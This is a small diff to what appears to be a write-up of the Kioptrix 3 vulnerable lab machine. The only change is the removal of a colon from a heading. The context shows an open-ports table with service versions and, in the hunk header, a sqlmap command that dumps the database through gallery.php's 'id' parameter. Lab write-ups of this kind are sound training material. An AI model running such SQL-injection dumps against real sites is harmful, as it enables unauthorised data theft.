@@ -113,7 +113,7 @@ sqlmap --batch -u "http://kioptrix3.com/gallery/gallery.php?id=null" --dump
 
 
 ### Findings
-#### Open Ports:
+#### Open Ports
 ``` {.python .numberLines}
 22/tcp  |  ssh   |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 80/tcp  |  http  |  Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
